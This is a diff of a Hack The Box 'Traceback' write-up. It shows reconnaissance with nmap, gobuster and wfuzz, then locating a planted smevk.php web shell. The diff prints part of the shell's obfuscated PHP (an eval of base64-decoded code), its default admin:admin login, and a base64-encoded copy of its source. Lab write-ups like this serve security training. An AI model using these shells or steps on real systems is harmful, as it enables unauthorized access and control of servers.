@@ -43,9 +43,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
 ```
 
-Only port 22 and 80 open
-
-connecting to ssh:
+The only ports that were open were 22 -SSH and 80 - HTTP. I first tried connecting to ssh:
 
 ```text
 #################################
@@ -54,19 +52,25 @@ connecting to ssh:
 #################################
 ```
 
-
+I wasn't able to login, but I noticed a banner saying that the system had been owned due to poor configurations by someone named `Xh4H`. 
 
 ![](../../.gitbook/assets/screenshot_2020-06-21_16-48-34%20%281%29.png)
 
-`gobuster dir -u http://10.10.10.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster`
+Connecting to port 80 through a web browser gave me a very similar message. It also said something about a backdoor, so I fired up `gobuster` to see if I could find any other pages since there were no other hints or ways to progress.  
 
-connection blocked and nothing found
+```text
+gobuster dir -u http://10.10.10.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster
+```
 
-web search for `FREE INTERNETZZZ` leads to "Pretty interesting collection of webshells:" [https://twitter.com/RiftWhiteHat/status/1237311680276647936](https://twitter.com/RiftWhiteHat/status/1237311680276647936) which leads to [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells)
+Unfortunately this did not get me anywhere, as the connection was blocked and I wasn't able to find anything.
 
-OSINT challenge?
+Next I tried a web search for `FREE INTERNETZZZ`, which led me to Twitter of all places.
 
-I didn't know which web shell was used, and the hint left by @XH4H only led to a list of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site \(and I hoped that the filename hadn't been changed!
+![](../../.gitbook/assets/free-internetzzzz.png)
+
+"Pretty interesting collection of webshells:"  says the [author](https://twitter.com/RiftWhiteHat/status/1237311680276647936) of this machine...and posted around the same time as the release \(14 Mar 2020 - See [info card](traceback-write-up.md#overview)\).  This felt a lot like an OSINT-type challenge to me.   Clicking on the post led to a collection of "Some of the best web shells that you might need" at [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells).
+
+I didn't know which web shell was used, and the hint left by @XH4H only led to a GitHub repository with a collection of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site. _\(And I hoped that the filename hadn't been changed!\)_
 
 ```bash
 zweilos@kali:~/htb/traceback/webshells$ ls -1 > webshells
@@ -95,11 +99,11 @@ Requests/sec.: 18.04628
 
 ## Initial Foothold
 
-found `http://10.10.10.181/smevk.php`
-
-screenshot
+Using `wfuzz` I was able to find the web shell used at `http://10.10.10.181/smevk.php`.I navigated to this page and got a login screen.
 
 ![](../../.gitbook/assets/screenshot_2020-06-22_13-13-58.png)
+
+I opened the code of the `smevk.php` web shell that I had downloaded earlier and didn't have to search long to find what I was looking for.
 
 ```text
 <?php 
@@ -138,11 +142,15 @@ eval("?>".(base64_decode($smevk)));
 ?>
 ```
 
-used default credentials of `admin:admin` from [https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)
+The code came with hard-coded default credentials of `admin:admin`. I tried them out on the login page, and was granted access to the shell page.
 
 ![](../../.gitbook/assets/screenshot_2020-06-22_13-18-32.png)
 
-It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! &gt; worked just fine in Chromium!
+When I first started poking around, clicking on buttons and trying to use the shell to enumerate the system I was getting a bit frustrated.  Nothing seemed to be working.  Below are my original notes:
+
+> It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! &gt; worked just fine in Chromium!
+
+For some reason the web shell did not function properly in Firefox.  When I finally got tired of banging my head against the shell trying to find something that worked, I decided to try opening it in Chromium instead...and everything worked!
 
 ```text
 zweilos@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
@@ -189,7 +197,7 @@ function printLogin() {
 ?base64: invalid input
 ```
 
-After doing some troubleshooting and looking into the code it seems as if the webshell itself is looking for HTTP\_USER\_AGENT with 'Google' in it. Not sure why this might interfere since it seems to give a 404 error if the user agent IS Google...
+After doing some troubleshooting and looking into the code it seems as if the web shell itself is looking for a HTTP\_USER\_AGENT with 'Google' in it. Not sure why this might interfere since it seems to give a 404 error if the user agent IS Google...This may be just to keep the Google bots from crawling the page and discovering the backdoor.  I didn't poke into the code too far, because I had gotten it working and wanted to move on.  Perhaps this is something I could look into in the future.
 
 ## Road to User
 
